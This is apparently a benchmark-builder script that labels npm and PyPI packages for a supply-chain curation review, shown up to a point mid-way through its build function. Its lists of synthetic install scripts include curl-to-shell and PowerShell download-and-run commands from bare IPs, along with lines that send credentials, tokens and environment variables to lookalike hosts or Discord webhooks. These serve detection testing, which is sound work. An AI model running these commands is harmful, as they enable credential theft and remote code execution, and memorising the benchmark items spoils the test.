"""Task `curation`: classify a package for the curation review queue.

choice over malicious / abandoned / license_incompatible / benign (rubric identical to the pilot).

Sources (all cached under data/curation/ so rebuilds are offline and deterministic):
  npm registry        https://registry.npmjs.org/<name> + api.npmjs.org weekly downloads, for ~1,000
                      packages: a popular list, a stale/deprecated list, copyleft candidates, and
                      ~450 packages found by registry search for AGPL/GPL/LGPL/SSPL/BUSL/UNLICENSED/...
  PyPI JSON API       https://pypi.org/pypi/<name>/json for ~400 packages (top list + old ones)
  OSV MAL advisories  parsed from the OSV npm/PyPI dumps (data/typosquat/osv-*.zip, shared with the
                      typosquat task): real malicious package names, versions, discovery dates and the
                      analyst write-up of the payload

Labels:
  benign               real record: permissive license, published within 18 months, not deprecated/yanked
                       (records with a legitimate install script are kept and marked HARD)
  abandoned            real record: deprecated on npm OR latest release > 4 years ago (npm or PyPI);
                       synthetic top-up from benign donors only if the real pool runs short
  license_incompatible real record whose declared license is copyleft / source-available /
                       noncommercial / proprietary / missing, published within 18 months
  malicious            real OSV MAL advisory: real name, version, registry and discovery date; the
                       install-script field carries a behaviour-only paraphrase of the analyst
                       write-up (label words such as "malicious" are removed); README, downloads,
                       maintainer age and license are synthesized and listed in meta.synthetic_fields.
                       ~13% are HARD: a tame-looking script whose README leaks the exfiltration.

Records that would trigger two labels (deprecated AND copyleft) are excluded so ground truth is
unambiguous. "As of" is pinned to 2026-09-23 so relative dates are stable.
"""
import json, os, random, re, time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone

from . import Item, cache_path, write_items

NAME = "curation"
QKEY = "verdict"
CRITERIA = {
    "malicious": "install/postinstall scripts that download or execute remote code, obfuscated payloads, credential or env exfiltration",
    "abandoned": "deprecated flag set, OR last release more than 4 years ago (treat an old last_release as abandoned even when not flagged), unmaintained with open security issues, dead repository",
    "license_incompatible": "license is copyleft, source-available, noncommercial, or missing, conflicting with a permissive-only policy",
    "benign": "actively maintained, permissive license, ordinary code, no suspicious scripts",
}
QUESTION = {QKEY: {"type": "choice",
                   "instructions": "Classify this package for the curation review queue. Policy: only permissive licenses are allowed.",
                   "criteria": CRITERIA}}

ASOF = datetime(2026, 9, 23, tzinfo=timezone.utc)
UA = {"User-Agent": "jev-bench/0.1 (+https://github.com/brandonrc/jev-bench)"}

# ---------------------------------------------------------------- candidate package lists (npm)
POPULAR = """lodash react react-dom express chalk commander axios debug tslib typescript vue next webpack
babel-loader @babel/core @babel/preset-env eslint prettier jest mocha chai sinon supertest nodemon dotenv
yargs minimist uuid moment dayjs date-fns luxon rxjs zod yup joi ajv semver glob fast-glob fs-extra
rimraf mkdirp chokidar ws socket.io cors body-parser cookie-parser helmet morgan winston pino bunyan
mongoose mongodb pg mysql2 redis ioredis sequelize knex typeorm prisma @prisma/client bullmq bull
node-fetch got undici superagent form-data qs querystring-es3 path-to-regexp micromatch picomatch
inquirer ora cli-progress boxen figlet strip-ansi ansi-styles supports-color kleur picocolors
esbuild vite rollup parcel terser postcss autoprefixer tailwindcss sass less stylus cssnano
react-router react-router-dom redux react-redux @reduxjs/toolkit zustand jotai mobx immer reselect
@tanstack/react-query swr formik react-hook-form styled-components @emotion/react @mui/material
antd @chakra-ui/react @radix-ui/react-dialog framer-motion three d3 chart.js recharts victory
@angular/core @angular/common @angular/cli svelte solid-js preact lit alpinejs htmx.org jquery
electron @electron/packager puppeteer playwright cypress @testing-library/react enzyme
@types/node @types/react @types/lodash @types/express ts-node tsx ts-jest vitest esbuild-register
nest @nestjs/core @nestjs/common fastify koa hapi @hapi/hapi restify sails
graphql @apollo/server @apollo/client graphql-tag urql apollo-server-express
passport passport-local passport-jwt jsonwebtoken bcrypt bcryptjs argon2 crypto-js tweetnacl
nodemailer @sendgrid/mail twilio stripe aws-sdk @aws-sdk/client-s3 @google-cloud/storage firebase firebase-admin
sharp jimp canvas pdfkit pdf-lib jspdf xlsx exceljs csv-parse papaparse fast-csv js-yaml yaml toml ini xml2js fast-xml-parser cheerio jsdom
marked markdown-it remark unified rehype highlight.js prismjs shiki
lodash-es underscore ramda immutable core-js regenerator-runtime
async bluebird p-limit p-map p-queue p-retry delay
classnames clsx nanoid shortid cuid ulid
validator sanitize-html dompurify xss he entities
compression serve-static express-session connect-redis express-rate-limit
concurrently cross-env npm-run-all husky lint-staged commitlint
lerna nx turbo changesets @changesets/cli pnpm yarn npm
mime mime-types file-type busboy multer formidable
ip ipaddr.js node-forge jsrsasign
socket.io-client mqtt amqplib kafkajs
node-cron cron agenda
i18next react-i18next intl-messageformat
storybook @storybook/react
webpack-cli webpack-dev-server html-webpack-plugin mini-css-extract-plugin css-loader style-loader file-loader
babel-jest @babel/preset-react @babel/preset-typescript @babel/plugin-transform-runtime
eslint-plugin-react eslint-plugin-import eslint-config-prettier @typescript-eslint/parser @typescript-eslint/eslint-plugin
open execa shelljs zx which cross-spawn tree-kill
tar archiver adm-zip jszip unzipper yauzl
node-gyp nan node-addon-api bindings prebuild-install node-gyp-build
better-sqlite3 sqlite3 level classic-level
fsevents bufferutil utf-8-validate
core-util-is inherits safe-buffer readable-stream through2 pump end-of-stream
object-assign extend deepmerge lodash.merge lodash.get lodash.debounce
""".split()

STALE_CANDIDATES = """request request-promise request-promise-native left-pad node-uuid gulp-util istanbul jade bower
coffee-script grunt-cli phantomjs phantomjs-prebuilt node-sass tslint protractor karma-phantomjs-launcher
babel-preset-es2015 babel-preset-stage-0 babel-core optimist natives hoek boom cryptiles wreck hawk sntp
har-validator querystring flatten circular-json resolve-url urix source-map-resolve source-map-url stable
rollup-plugin-babel rollup-plugin-node-resolve rollup-plugin-commonjs rollup-plugin-json @babel/polyfill
babel-polyfill babel-eslint tslint-react codelyzer jasmine-node mocha-phantomjs casperjs slimerjs nightmare
zombie component swig nodeunit vows codecov nsp david greenkeeper-lockfile generator-angular angular
angular-route angular-animate angular-ui-router angular-resource @angular/http @angular/flex-layout
react-addons-test-utils react-addons-css-transition-group react-addons-update react-hot-loader
enzyme-adapter-react-16 flux backbone zepto mootools polymer @polymer/polymer bootstrap-sass material-ui
@material-ui/core @material-ui/icons es5-shim es6-shim q when rsvp co thunkify isomorphic-fetch unirest
restler popsicle reqwest mailgun-js sendgrid paypal-rest-sdk mongoskin mongojs bookshelf waterline
loopback loopback-datasource-juggler strong-remoting loopback-boot mysql hiredis memcached nedb lokijs
npmlog are-we-there-yet gauge inflight fstream osenv uid-number node-pre-gyp ffi ref ffi-napi ref-napi
edge child-process-promise cross-spawn-async spawn-sync opn colors cli-table cli-table2 progress
nomnom cliff prompt keypress blessed blessed-contrib charm ansi has-color underscore.string
string util-extend es6-object-assign babel-runtime extract-text-webpack-plugin uglifyjs-webpack-plugin
optimize-css-assets-webpack-plugin happypack hard-source-webpack-plugin awesome-typescript-loader
eslint-loader jscs typings tsd supervisor forever node-inspector electron-prebuilt electron-packager
electron-rebuild electron-notarize electron-osx-sign asar phonegap ionic react-native-cli expo-cli exp
create-react-app react-scripts vue-cli angular-cli generator-webapp brunch parallelshell ecstatic
gulp-minify-css gulp-ruby-sass jshint chokidar-cli travis-ci nw-builder cordova node-fetch-npm
gulp gulp-sass gulp-uglify gulp-concat gulp-rename gulp-watch gulp-if gulp-plumber gulp-sourcemaps gulp-babel
grunt grunt-contrib-uglify grunt-contrib-watch grunt-contrib-concat grunt-contrib-jshint grunt-contrib-copy
bower-installer yeoman-generator yo generator-generator jspm systemjs requirejs almond browserify watchify
karma karma-jasmine karma-chrome-launcher jasmine-core protractor-jasmine2-html-reporter webdriverio-v4
coffeelint coffee-react cjsx-loader jsx-loader react-tools reactify envify uglifyify brfs
""".split()

COPYLEFT_CANDIDATES = """@wordpress/components @wordpress/element @wordpress/i18n @wordpress/hooks @wordpress/api-fetch
@wordpress/blocks @wordpress/data @wordpress/scripts ckeditor4 ckeditor5 @ckeditor/ckeditor5-core
@ckeditor/ckeditor5-react tinymce web3 web3-utils web3-eth web3-core web3-eth-contract openpgp
sonarqube-scanner @sonar/scan mariadb p5 lamejs @breezystack/lamejs ffmpeg-static @ffmpeg-installer/ffmpeg
@ffprobe-installer/ffprobe pngquant-bin mupdf zeromq jointjs @joint/core @blocknote/core @blocknote/react
fullpage.js lightgallery isotope-layout packery flickity infinite-scroll dhtmlx-gantt dhtmlx-scheduler
jsreport jsreport-core wildduck zone-mta mailtrain emailengine directus @directus/api n8n n8n-core n8n-workflow
tldraw @tldraw/editor bpmn-js dmn-js @bpmn-io/form-js mapbox-gl pubnub handsontable @handsontable/react
ag-grid-enterprise @ag-grid-enterprise/core @mui/x-data-grid-pro @mui/x-data-grid-premium @mui/x-date-pickers-pro
@mui/x-license @progress/kendo-react-grid @progress/kendo-licensing @syncfusion/ej2-grids @syncfusion/ej2-react-grids
@grapecity/spread-sheets @mescius/spread-sheets devextreme devextreme-react igniteui-angular @infragistics/igniteui-angular
gojs @bryntum/gantt @bryntum/grid @bryntum/scheduler highcharts @amcharts/amcharts5 @amcharts/amcharts4 @canvasjs/charts
fusioncharts anychart @arcgis/core @here/maps-api-for-javascript @tomtom-international/web-sdk-maps
@applitools/eyes-playwright @pdftron/webviewer @pdftron/pdfnet-node pspdfkit @nutrient-sdk/viewer @react-pdf-viewer/core
@sap/cds @sap/approuter @sap/xssec @sap/hana-client @dynatrace/oneagent appdynamics @zoom/videosdk @zoom/meetingsdk
agora-rtc-sdk-ng @strapi/strapi strapi @vendure/core carbone gsap froala-editor @fancyapps/ui @elastic/eui
@nut-tree/nut-js scrollmagic oracledb @onlyoffice/document-editor-react @matomo-org/matomo-tracker
""".split()

PYPI_STALE = """nose pycrypto python-memcached distribute BeautifulSoup unittest2 mock futures enum34 typing pathlib2
ipaddress functools32 subprocess32 backports.ssl-match-hostname argparse ordereddict M2Crypto Fabric3 suds
soappy pyxml elementtree django-social-auth python-social-auth south django-nose nosexcover pep8 readline
pyreadline ws4py cherrypy-wsgiserver web.py pika kombu MySQL-python sqlalchemy-migrate flask-script
httplib2 requests-oauth oauth2 python-oauth2 yolk virtualenvwrapper py2exe setuptools-git d2to1 versiontools
bzr pygtk PyQt4 pyside scikits.learn theano lasagne caffe chainer cntk pybrain nolearn pylearn2 pattern
mechanize twill pyvirtualdisplay xvfbwrapper""".split()

PERMISSIVE = {"MIT", "ISC", "BSD-2-CLAUSE", "BSD-3-CLAUSE", "APACHE-2.0", "0BSD", "UNLICENSE", "CC0-1.0", "MIT-0",
              "BSD", "APACHE", "WTFPL", "ZLIB", "BLUEOAK-1.0.0", "PYTHON-2.0", "CC-BY-4.0", "CC-BY-3.0", "PSF", "PSF-2.0",
              "UPL-1.0", "MIT*", "BSD*", "APACHE 2.0", "APACHE-2", "APACHE2", "MIT/X11", "NEW BSD", "BSD-3", "BSD-2",
              "ARTISTIC-2.0", "ISC*", "OFL-1.1", "MIT LICENSE", "APACHE LICENSE 2.0", "APACHE SOFTWARE LICENSE",
              "BSD LICENSE", "THE UNLICENSE (UNLICENSE)", "PUBLIC DOMAIN", "MIT-CMU", "BSD-3-CLAUSE-CLEAR", "HPND"}
NONPERM_KEYS = ("GPL", "MPL", "EPL", "CDDL", "EUPL", "SSPL", "BUSL", "-NC", "NONCOMMERCIAL", "NON-COMMERCIAL", "ELASTIC",
                "CPAL", "OSL", "CC-BY-SA", "CPL", "RPL", "COMMERCIAL", "PROPRIETARY", "AFFERO", "LESSER GENERAL", "GENERAL PUBLIC")


def _norm_license(v):
    if v is None:
        return ""
    if isinstance(v, dict):
        v = v.get("type") or v.get("name") or ""
    if isinstance(v, list):
        v = " OR ".join(_norm_license(x) for x in v)
    return str(v).strip()


def _is_permissive_expr(expr: str):
    """True / False / None (None = missing or unparseable; treated as incompatible under a permissive-only policy)."""
    e = (expr or "").strip().strip("()").upper()
    if not e:
        return None
    if e.startswith("SEE LICENSE") or e.startswith("HTTP") or e in {"UNLICENSED", "COMMERCIAL", "PROPRIETARY", "CUSTOM", "NONE", "OTHER/PROPRIETARY LICENSE"}:
        return False
    if " OR " in e:
        return any(_is_permissive_expr(p) for p in e.split(" OR "))
    if " AND " in e:
        return all(_is_permissive_expr(p) for p in e.split(" AND "))
    e = e.replace("-OR-LATER", "").replace("-ONLY", "").replace("+", "").strip()
    if e in PERMISSIVE:
        return True
    if any(k in e for k in NONPERM_KEYS):
        return False
    if any(k in e for k in ("MIT", "BSD", "APACHE", "ISC", "ZLIB", "UNLICENSE", "CC0")):
        return True
    return None


def _http_client():
    import httpx
    return httpx.Client(headers=UA, timeout=60, follow_redirects=True)


def _get_json(client, url, tries=4, params=None):
    import httpx
    for i in range(tries):
        try:
            r = client.get(url, params=params)
            if r.status_code == 404:
                return None
            if r.status_code in (429, 500, 502, 503, 504):
                time.sleep(1.5 * (2 ** i)); continue
            r.raise_for_status()
            return r.json()
        except (httpx.HTTPError, ValueError):
            time.sleep(1.5 * (2 ** i))
    return None


# ---------------------------------------------------------------- npm
def _extract(doc):
    if not doc or "dist-tags" not in doc:
        return None
    latest = doc["dist-tags"].get("latest")
    lv = doc.get("versions", {}).get(latest, {})
    scripts = lv.get("scripts") or {}
    inst = {k: v for k, v in scripts.items() if k in ("preinstall", "install", "postinstall")}
    repo = doc.get("repository") or lv.get("repository")
    if isinstance(repo, dict):
        repo = repo.get("url")
    t = doc.get("time", {})
    return {
        "name": doc["name"], "latest": latest, "registry": "npm",
        "license": _norm_license(lv.get("license") or doc.get("license") or lv.get("licenses") or doc.get("licenses")),
        "created": t.get("created"), "latest_time": t.get(latest), "modified": t.get("modified"),
        "maintainers": len(doc.get("maintainers") or []),
        "install_scripts": inst, "readme": (doc.get("readme") or "")[:600],
        "deprecated": lv.get("deprecated") or None, "repo": repo, "description": doc.get("description") or lv.get("description") or "",
    }


def fetch_registry(names):
    path = cache_path(NAME, "registry.json")
    cache = json.load(open(path)) if os.path.exists(path) else {}
    todo = [n for n in names if n not in cache]
    if todo:
        with _http_client() as c, ThreadPoolExecutor(6) as ex:
            def one(n):
                rec = _extract(_get_json(c, f"https://registry.npmjs.org/{n}"))
                dl = _get_json(c, f"https://api.npmjs.org/downloads/point/last-week/{n}") if rec else None
                if rec: rec["weekly_downloads"] = (dl or {}).get("downloads")
                return n, rec
            for i, (n, rec) in enumerate(ex.map(one, todo)):
                cache[n] = rec  # None marks a 404 so we don't retry forever
                if i % 100 == 99: json.dump(cache, open(path, "w"), indent=0)
        json.dump(cache, open(path, "w"), indent=0)
    return {n: cache[n] for n in names if cache.get(n)}


def npm_search_license_candidates():
    """Names from registry search for restricted-license terms (cached by a one-off script; regenerated if missing)."""
    path = cache_path(NAME, "npm-search.json")
    if os.path.exists(path):
        hits = json.load(open(path))
    else:
        hits = {}
        with _http_client() as c:
            for q in ["AGPL", "AGPL-3.0", "GPL-3.0", "GPL-2.0", "LGPL", "SSPL", "BUSL", "CC-BY-NC", "UNLICENSED", "copyleft",
                      "commercial license", "proprietary", "source-available", "Elastic License"]:
                for frm in (0, 250):
                    d = _get_json(c, "https://registry.npmjs.org/-/v1/search", params={"text": q, "size": 250, "from": frm}) or {}
                    for o in d.get("objects", []):
                        p = o["package"]; hits.setdefault(p["name"], {"query": q, "license": p.get("license"), "date": p.get("date")})
                    time.sleep(0.3)
        json.dump(hits, open(path, "w"))
    out = []
    for name, h in hits.items():
        if _is_permissive_expr(h.get("license") or "") is True:
            continue
        d = h.get("date")
        if d and (ASOF - datetime.fromisoformat(d.replace("Z", "+00:00"))).days > 540:
            continue  # would be stale too -> ambiguous
        out.append(name)
    return sorted(out)


# ---------------------------------------------------------------- PyPI
def load_pypi():
    path = cache_path(NAME, "pypi.json")
    return {k: v for k, v in (json.load(open(path)) if os.path.exists(path) else {}).items() if v}


def _pypi_license(rec):
    expr = rec.get("license_expression") or ""
    if expr:
        return expr
    cls = [c.split("::")[-1].strip() for c in rec.get("classifiers", [])]
    if cls:
        return cls[0]
    lic = (rec.get("license") or "").strip()
    return lic.splitlines()[0][:60] if lic else ""


# ---------------------------------------------------------------- OSV MAL advisories
LABEL_WORDS = re.compile(r"\b(malicious(?:ly)?|malware|spyware|stealer|info-?stealing|information-stealing|trojan(?:ized)?|backdoor(?:ed)?|"
                         r"threat actor|attacker(?:s)?|campaign|compromised|suspicious|nefarious|rogue|weaponi[sz]ed)\b", re.I)
BEHAVIOUR = re.compile(r"(download|execut|run[s ]|spawn|exfil|send[s ]|post[s ]|upload|collect|harvest|read[s ]|steal|environment|credential|"
                       r"token|\.npmrc|ssh|wallet|discord|webhook|dns|http|reverse shell|shell|base64|obfuscat|eval|child_process|"
                       r"powershell|curl|wget|payload|dropper|keylog|clipboard|screenshot|persistence|cron|registry key|hosts file|"
                       r"preinstall|postinstall|setup\.py|install hook|typosquat|impersonat|dependency confusion|c2|command and control|"
                       r"remote server|remote host|ip address|beacon|binary|\.exe|\.sh|\.ps1|autopublish|publish)", re.I)
BOILER = re.compile(r"---\s*_-=\s*Per source details\. Do not edit below this line\.\s*=-_\s*(---)?", re.I)


def _paraphrase(details: str) -> str:
    """Behaviour-only analyst note: drop the OSV boilerplate and sentences without concrete behaviour, strip label words."""
    d = BOILER.sub(" ", details or "")
    d = re.sub(r"## Source:\s*\S+\s*\([0-9a-f]{64}\)", " ", d)
    d = re.sub(r"\s+", " ", d).strip()
    d = re.split(r"---\s*Category:", d)[0]                      # trailing OSV category/reasons block
    d = re.sub(r"\bReasons \(based on[^)]*\):?", " ", d)
    sents = [s.strip(" -") for s in re.split(r"(?<=[.!?])\s+|\s-\s(?=[A-Z])", d) if s.strip(" -")]
    keep = [s for s in sents if BEHAVIOUR.search(s) and not re.match(r"(?i)(this|the) (package|advisory) (is|was|has been) (a |an )?(malicious|flagged|removed|reported)", s)]
    txt = " ".join(keep)[:320]
    txt = LABEL_WORDS.sub("flagged", txt)
    txt = re.sub(r"flagged:\s*\d{4}-\d{2}-\S+", " ", txt)
    txt = re.sub(r"\b(flagged)\s+(package|code|packages|behavio[u]r|activity)\b", r"\2", txt, flags=re.I)
    txt = re.sub(r"\s+", " ", txt)
    return txt.strip(" -")


def load_mal(rng, limit_per_text=4):
    path = cache_path(NAME, "mal-advisories.json")
    if not os.path.exists(path):
        raise FileNotFoundError(f"{path} missing; run the OSV extraction (see module docstring)")
    raw = json.load(open(path))
    seen = {}
    out = []
    for a in raw:
        note = _paraphrase(a["details"])
        if len(note) < 60:
            continue
        key = note[:80]
        if seen.get(key, 0) >= limit_per_text:
            continue  # campaign boilerplate repeated across thousands of names
        seen[key] = seen.get(key, 0) + 1
        out.append({**a, "note": note})
    rng.shuffle(out)
    return out


# ---------------------------------------------------------------- state rendering
def _age_str(iso):
    if not iso:
        return None
    d = datetime.fromisoformat(iso.replace("Z", "+00:00"))
    days = (ASOF - d).days
    if days < 45: return f"{max(days, 1)} days ago ({d.date()})"
    if days < 700: return f"{days // 30} months ago ({d.date()})"
    return f"{days // 365} years ago ({d.date()})"


def _years(iso):
    return (ASOF - datetime.fromisoformat(iso.replace("Z", "+00:00"))).days / 365.25 if iso else None


def _state_npm(rec):
    scripts = rec["install_scripts"]
    return {
        "package": f"{rec['name']}@{rec['latest']}", "registry": "npm",
        "license": rec["license"] or "(none declared)",
        "last_release": _age_str(rec["latest_time"]),
        "weekly_downloads": rec.get("weekly_downloads"),
        "maintainers": f"{rec['maintainers']} npm maintainers",
        "install_scripts": "; ".join(f"{k}: {v}" for k, v in scripts.items()) if scripts else "none",
        "readme_excerpt": (rec["readme"] or rec["description"]).strip(),
        "open_issues": None,
        "deprecated": bool(rec["deprecated"]) and (rec["deprecated"] if isinstance(rec["deprecated"], str) else True),
    }


def _state_pypi(rec):
    who = rec.get("maintainer") or rec.get("author") or "unknown"
    return {
        "package": f"{rec['name']}=={rec['latest']}", "registry": "pypi",
        "license": _pypi_license(rec) or "(none declared)",
        "last_release": _age_str(rec["latest_time"]),
        "weekly_downloads": None,
        "maintainers": f"{who} ({rec['n_releases']} releases since {rec['created'][:10] if rec.get('created') else '?'})",
        "install_scripts": "none (wheel)" if rec.get("requires_python") else "none",
        "readme_excerpt": (rec.get("summary") or "") + " " + (rec.get("description") or "")[:500],
        "open_issues": None,
        "deprecated": bool(rec.get("yanked")),
    }


# ---------------------------------------------------------------- synthetic ingredients
MALICIOUS_SCRIPTS = [
    "postinstall: curl -s https://cdn-metrics[.]top/i.sh | sh",
    "postinstall: node -e \"require('child_process').exec('curl -fsSL http://45.9.148.22/x.sh | bash')\"",
    "preinstall: node lib/init.js  (init.js: eval(Buffer.from('Y29uc3QgZnM9cmVxdWlyZSgnZnMnKTsg...','base64').toString()))",
    "postinstall: node scripts/setup.js  (setup.js reads ~/.npmrc, ~/.aws/credentials, ~/.ssh/id_rsa and POSTs them to https://api.npm-stats[.]xyz/v1/collect)",
    "install: node -e \"const h=require('os').hostname();require('dns').resolve(Buffer.from(JSON.stringify(process.env)).toString('hex').slice(0,60)+'.'+h+'.dns.telemetry-node[.]com',()=>{})\"",
    "postinstall: node bin/dl.js  (dl.js: downloads ./bin/{platform}-{arch}/node-helper from a bare IP over HTTP, chmod +x, spawns it detached)",
    "postinstall: powershell -ep bypass -c \"iwr http://185.220.101.4/u.ps1 -useb | iex\" || bash -c \"$(curl -fsSL http://185.220.101.4/u.sh)\"",
    "preinstall: node -e \"const{execSync:e}=require('child_process');e('git config --global --get user.email > /tmp/.e && curl -X POST --data-binary @/tmp/.e http://162.55.19.7/c')\"",
    "postinstall: node index.js  (index.js is 1 line, 48 KB, fully obfuscated with javascript-obfuscator; string array rotates through _0x4f2a)",
    "postinstall: node -e \"process.env.CI||require('https').request({host:'ghtoken-check[.]net',path:'/'+encodeURIComponent(process.env.GITHUB_TOKEN||process.env.NPM_TOKEN||''),method:'GET'}).end()\"",
    "install: node scripts/postinstall.js  (walks $HOME for *.env, wallet.dat, .kube/config, exfiltrates via Discord webhook)",
    "postinstall: npx --yes @internal/verify-env@1.0.3  (package does not exist on npm; resolved from a .npmrc registry override injected by preinstall)",
]
PYPI_MALICIOUS_SCRIPTS = [
    "setup.py: custom install command runs exec(base64.b64decode(...)) before setuptools.setup()",
    "setup.py: urllib.request.urlopen('http://45.9.148.22/p.py').read() piped to exec() at import time",
    "setup.py: reads ~/.aws/credentials, ~/.ssh/id_rsa and os.environ, POSTs to https://api.pypi-stats[.]xyz/collect",
    "__init__.py: on import, downloads a platform binary from a bare IP, chmod +x, subprocess.Popen(..., start_new_session=True)",
    "setup.py: sends socket.gethostname(), getpass.getuser() and the contents of .netrc to a Discord webhook",
    "setup.py: 1 line, 60 KB, obfuscated with pyarmor; drops a cron entry under ~/.config",
]
TAME_MALICIOUS_SCRIPTS = [
    "postinstall: node scripts/telemetry.js",
    "postinstall: node scripts/collect-usage.js",
    "prepare: node scripts/verify-install.js",
    "postinstall: node ./tools/report.js --silent",
]
TAME_MALICIOUS_README = [
    " Note: installation runs scripts/telemetry.js which posts your environment variables, hostname and the contents of ~/.npmrc to a collection endpoint at 91.92.242.30 so we can improve compatibility.",
    " The install step sends process.env and the resolved path of your AWS credentials file to our usage endpoint; there is no opt-out yet.",
    " verify-install.js contacts our licensing server with your npm auth token to confirm entitlement.",
    " report.js uploads a snapshot of your shell history and SSH known_hosts to help us reproduce install failures.",
]
HARD_BENIGN_SCRIPTS = [
    "install: node-gyp rebuild",
    "install: prebuild-install || node-gyp rebuild",
    "install: node-gyp-build",
    "prepare: husky install",
    "postinstall: patch-package",
    "postinstall: node install.js  (downloads the pinned Electron binary for this platform from https://github.com/electron/electron/releases and verifies its SHASUMS256.txt)",
    "postinstall: node scripts/download-chromium.js  (fetches the pinned Chromium revision from https://storage.googleapis.com/chromium-browser-snapshots, checks the sha256)",
    "postinstall: node -e \"try{require('./build/Release/binding.node')}catch(e){console.warn('native addon not built; falling back to JS implementation')}\"",
    "install: node scripts/install.js  (downloads the platform binary from https://github.com/sass/dart-sass/releases, falls back to building from source)",
    "postinstall: opencollective-postinstall || true",
    "postinstall: node scripts/postinstall.js  (prints a thank-you banner and the link to the changelog; no network)",
    "postinstall: node ./scripts/check-node-version.js",
    "install: node-pre-gyp install --fallback-to-build",
    "postinstall: node scripts/ensure-sharp.js  (verifies the libvips binary from https://github.com/lovell/sharp-libvips/releases matches its signed checksum)",
]
GENERIC_README = [
    "{n} - lightweight helpers for everyday {eco} projects. Zero dependencies. Install and import; see the examples folder.",
    "{n}: a small utility package. Fast, tested, typed. Contributions welcome.",
    "Utilities for {n}. Works in Node and the browser. MIT licensed.",
    "{n} provides a simple API for common tasks. See the docs for usage and a changelog.",
    "A modern toolkit: {n}. Includes CLI and library entry points.",
]
SYNTH_LICENSES = ["AGPL-3.0-only", "GPL-3.0-or-later", "GPL-2.0-only", "LGPL-2.1-or-later", "MPL-2.0", "SSPL-1.0", "BUSL-1.1",
                  "Elastic-2.0", "CC-BY-NC-4.0", "CC-BY-NC-SA-4.0", "UNLICENSED", "SEE LICENSE IN LICENSE", "EUPL-1.2", "(none declared)"]


def _mal_state(adv, rng, hard):
    eco = adv["ecosystem"]; name = adv["name"]
    version = adv["versions"][0] if adv.get("versions") else f"{rng.randint(0, 2)}.{rng.randint(0, 9)}.{rng.randint(0, 20)}"
    pub = adv.get("published")
    days_ago = (ASOF - datetime.fromisoformat(pub.replace("Z", "+00:00"))).days if pub else rng.randint(2, 30)
    days_ago = max(days_ago, 1)
    synthetic = ["license", "weekly_downloads", "maintainers", "readme_excerpt", "open_issues"]
    if not adv.get("versions"): synthetic.append("package")
    st = {
        "package": f"{name}@{version}" if eco == "npm" else f"{name}=={version}", "registry": eco,
        "license": rng.choice(["MIT", "MIT", "ISC", "Apache-2.0", "(none declared)"]),
        "last_release": f"{days_ago} days ago" if days_ago < 45 else _age_str(pub),
        "weekly_downloads": rng.randint(3, 400),
        "maintainers": f"1 {'npm' if eco == 'npm' else 'PyPI'} maintainer (account created {rng.randint(1, 40)} days before this release, no other packages)",
        "install_scripts": None,
        "readme_excerpt": rng.choice(GENERIC_README).format(n=name, eco="JavaScript" if eco == "npm" else "Python"),
        "open_issues": 0,
        "deprecated": False,
    }
    if hard:
        st["install_scripts"] = rng.choice(TAME_MALICIOUS_SCRIPTS) if eco == "npm" else "setup.py: runs scripts/telemetry.py after install"
        st["readme_excerpt"] = (st["readme_excerpt"] + rng.choice(TAME_MALICIOUS_README)).strip()
        synthetic.append("install_scripts")
    else:
        head = rng.choice(["postinstall: node index.js", "preinstall: node lib/init.js", "postinstall: node scripts/setup.js", "install: node bin/dl.js"]) \
            if eco == "npm" else rng.choice(["setup.py: custom install command", "setup.py: code at import time", "__init__.py: on import"])
        st["install_scripts"] = f"{head}  (static analysis: {adv['note']})"
    return st, synthetic


def _synth_abandoned(rec, rng):
    st = _state_npm(rec)
    yrs = rng.randint(5, 9); d = ASOF.replace(year=ASOF.year - yrs)
    st["last_release"] = f"{yrs} years ago ({d.date()})"
    st["deprecated"] = rng.choice([True, "This package is no longer maintained", "Deprecated: use the maintained fork instead", "unmaintained; repository archived"])
    st["open_issues"] = rng.randint(120, 480)
    st["readme_excerpt"] = (st["readme_excerpt"][:420] + " NOTE: this project is no longer maintained. The repository has been archived.").strip()
    return st, ["last_release", "deprecated", "open_issues", "readme_excerpt"]


def _synth_license(rec, rng):
    st = _state_npm(rec)
    st["license"] = rng.choice(SYNTH_LICENSES)
    return st, ["license"]


# ---------------------------------------------------------------- build
import re as _re
_SECRET = _re.compile(r"\b(npm_[A-Za-z0-9]{36}|ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|AKIA[0-9A-Z]{16}|xox[baprs]-[A-Za-z0-9-]{10,}|sk-[A-Za-z0-9]{32,})\b")
def _scrub(obj):
    """Public advisory text sometimes quotes leaked credentials; never let them into the dataset."""
    if isinstance(obj, str): return _SECRET.sub(lambda m: m.group(0)[:4] + "[REDACTED_TOKEN]", obj)
    if isinstance(obj, dict): return {k: _scrub(v) for k, v in obj.items()}
    if isinstance(obj, list): return [_scrub(v) for v in obj]
    return obj

def build(n: int = 1200, seed: int = 0):
    rng = random.Random(seed)
    top_path = os.path.join(os.path.dirname(cache_path(NAME, "x")), "..", "typosquat", "top-npm.json")
    top = [d["name"] for d in json.load(open(top_path))] if os.path.exists(top_path) else []
    search_names = npm_search_license_candidates()
    rng.shuffle(search_names); search_names = search_names[:450]
    names = list(dict.fromkeys(POPULAR + STALE_CANDIDATES + COPYLEFT_CANDIDATES + top + search_names))
    recs = fetch_registry(names)
    pypi = load_pypi()
    mal = load_mal(rng)

    pools = {"benign": [], "benign_hard": [], "abandoned": [], "license_incompatible": []}
    for name in names:
        rec = recs.get(name)
        if not rec or not rec.get("latest_time"):
            continue
        perm = _is_permissive_expr(rec["license"])
        age = _years(rec["latest_time"])
        stale = bool(rec["deprecated"]) or age > 4
        fresh = age <= 1.5 and not rec["deprecated"]
        has_script = bool(rec["install_scripts"])
        triggers = [k for k, v in (("abandoned", stale), ("license_incompatible", perm is not True)) if v]
        if len(triggers) > 1:
            continue  # ambiguous ground truth
        if triggers == ["abandoned"] and perm is True:
            pools["abandoned"].append(("npm", rec))
        elif triggers == ["license_incompatible"] and fresh:
            pools["license_incompatible"].append(("npm", rec))
        elif not triggers and fresh:
            (pools["benign_hard"] if has_script else pools["benign"]).append(("npm", rec))
    for name, rec in pypi.items():
        if not rec.get("latest_time"):
            continue
        perm = _is_permissive_expr(_pypi_license(rec))
        age = _years(rec["latest_time"])
        stale = bool(rec.get("yanked")) or age > 4
        fresh = age <= 1.5 and not rec.get("yanked")
        triggers = [k for k, v in (("abandoned", stale), ("license_incompatible", perm is not True)) if v]
        if len(triggers) > 1:
            continue
        if triggers == ["abandoned"] and perm is True:
            pools["abandoned"].append(("pypi", rec))
        elif triggers == ["license_incompatible"] and fresh:
            pools["license_incompatible"].append(("pypi", rec))
